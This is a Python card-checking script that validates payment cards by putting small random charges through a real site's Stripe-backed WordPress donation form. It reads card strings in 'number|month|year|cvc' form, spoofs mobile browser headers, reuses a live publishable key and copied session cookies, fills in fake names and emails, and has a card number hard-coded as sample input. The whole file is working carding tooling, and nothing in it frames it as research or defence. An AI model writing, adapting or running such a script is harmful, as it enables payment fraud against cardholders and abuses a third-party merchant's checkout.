import requests
import random
import json
from user_agent import generate_user_agent

def Tele(ccx):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        r = requests.session()
        user = generate_user_agent()
        
        random1 = random.randint(1, 9)
        random2 = random.randint(1, 99)
        random3 = random.randint(20, 999)
        random_name = f"User{random.randint(1,999)}"
        random_email = f"user{random.randint(1,9999)}@gmail.com"
        random_amount = round(random.uniform(0.5, 5.0), 2)
        
        # ============ FIRST REQUEST: Create Payment Method ============
        headers1 = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user,
        }
        
        data1 = f'type=card&billing_details[name]={random_name}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=780ea92f-ee68-43db-9225-72beb68142058722f5&muid=1147b8cb-3ae2-4f1f-b736-578ad6f2f2f1ddf5ff&sid=f6319f08-314c-410b-a730-5a5327e6f9547d17b0&pasted_fields=number&payment_user_agent=stripe.js%2F81274c9437%3B+stripe-js-v3%2F81274c9437%3B+card-element&referrer=https%3A%2F%2Ftorr.ie&time_on_page=47632&client_attribution_metadata[client_session_id]=ea08e373-28fd-4326-aacb-9d0d3c590478&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=ecfbe540-0f90-4f0a-a99e-0fa569f10247&key=pk_live_51JVKouAs6DndN9b8mx4e9zfXHN3jWXh6L0V2n3xk59hs90Nqy9RuqM2nqdjQkKPOB5DwBgoe9poeThAhanhLNPi900zHJa87Tz'
        
        r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1)
        
        pm = r1.json()['id']
        
        # ============ SECOND REQUEST: Submit Payment ============
        headers2 = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://torr.ie',
            'Referer': 'https://torr.ie/payments/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': user,
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }
        
        # Cookies from curl
        cookies = {
            '__stripe_mid': '1147b8cb-3ae2-4f1f-b736-578ad6f2f2f1ddf5ff',
            '__stripe_sid': 'f6319f08-314c-410b-a730-5a5327e6f9547d17b0',
        }
        
        data2 = {
            'action': 'wp_full_stripe_inline_payment_charge',
            'wpfs-form-name': 'default',
            'wpfs-form-get-parameters': '{}',
            'wpfs-custom-amount-unique': str(random_amount),
            'wpfs-custom-input[]': random_name,
            'wpfs-card-holder-email': random_email,
            'wpfs-card-holder-name': random_name,
            'wpfs-stripe-payment-method-id': pm,
        }
        
        r2 = requests.post('https://torr.ie/wp-admin/admin-ajax.php', headers=headers2, cookies=cookies, data=data2)
        
        return r2.json()
    
    except Exception as e:
        return {"error": str(e)}

# ============ MAIN EXECUTION ============
if __name__ == "__main__":
    card_data = "5336213216036270|06|26|815"
    result = Tele(card_data)
    print(json.dumps(result, indent=2))
